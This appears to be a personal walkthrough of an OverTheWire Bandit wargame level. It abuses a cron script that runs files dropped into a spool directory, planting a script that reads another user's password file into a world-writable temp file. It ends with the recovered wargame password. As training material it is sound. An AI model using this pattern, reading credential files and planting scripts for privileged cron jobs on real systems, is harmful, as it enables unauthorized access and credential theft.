- ssh bandit23@bandit.labs.overthewire.org -p2220
- cat /usr/bin/cronjob_bandit24.sh
```
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
- nano test.sh
> cat /etc/bandit_pass/bandi24 > /tmp/dofox/pass
- chmod a+x test.sh (**add execute permission to all**)
- touch pass; chmod 666 pass (**make pass file with write permission for all to get the pass written**)
- cp test.sh /var/spool/bandit24 (**copy script to the dir and wait for 1 minute)
- cat pass
> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

continue to [[level 24]]
